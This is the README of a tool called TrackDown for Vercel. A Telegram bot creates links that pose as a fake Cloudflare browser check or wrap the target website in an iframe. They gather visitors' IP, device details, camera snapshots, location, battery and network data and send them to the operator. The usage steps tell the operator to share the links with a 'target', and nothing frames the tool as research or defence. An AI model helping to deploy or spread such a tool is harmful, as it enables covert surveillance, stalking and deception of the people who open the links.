# TrackDown for Vercel

This is a serverless version of the [TrackDown](https://github.com/Th30neAnd0nly/TrackDown) project, modified to work on Vercel using webhooks instead of long polling.

## Features

- Create tracking links that collect various information:
  - IP address
  - Device information
  - Camera snapshots
  - Location data
  - Network information
  - Battery status
  - Connected devices

- Two types of tracking links:
  1. **Cloudflare Page:** Shows a fake Cloudflare "checking your browser" page
  2. **Webview Page:** Shows the target website in an iframe

## Deployment to Vercel

### Prerequisites

- A Telegram bot token (get one from [@BotFather](https://t.me/BotFather))
- A Vercel account
- A GitHub account

### Steps

1. **Push to GitHub**
   - Fork or push this repository to your GitHub account

2. **Deploy to Vercel**
   - Go to [Vercel](https://vercel.com)
   - Create a new project and import your GitHub repository
   - Add the following environment variable:
     - Name: `bot`
     - Value: Your Telegram bot token
   - (Optional) Add a custom domain if desired

3. **Set Up Webhook**
   - After deployment, get your Vercel URL (e.g., `https://your-app.vercel.app`)
   - Run the following command (replace `<YOUR_BOT_TOKEN>` with your actual token):
   ```
   curl -F "url=https://your-app.vercel.app/webhook" https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook
   ```

4. **Test Your Bot**
   - Open your bot in Telegram
   - Send the `/start` command
   - Follow the instructions to create tracking links

## Usage

1. Start a chat with your bot on Telegram
2. Send `/create` to generate a new tracking link
3. Enter the target URL when prompted
4. The bot will provide you with two tracking links:
   - Cloudflare Page link
   - Webview Page link
5. Share these links with your target
6. When the target opens the link, their information will be sent to your Telegram

## Local Development

For local development, the application uses polling mode instead of webhooks. This is activated automatically when running in a non-production environment.

To run locally:

1. Clone the repository
2. Create a `.env` file with your bot token:
   ```
   bot=YOUR_BOT_TOKEN
   ```
3. Install dependencies:
   ```
   npm install
   ```
4. Run the server:
   ```
   npm start
   ```

## Important Notes

- Some features (like camera access) require user permission
- Many websites block iframe embedding, which may affect the Webview Page functionality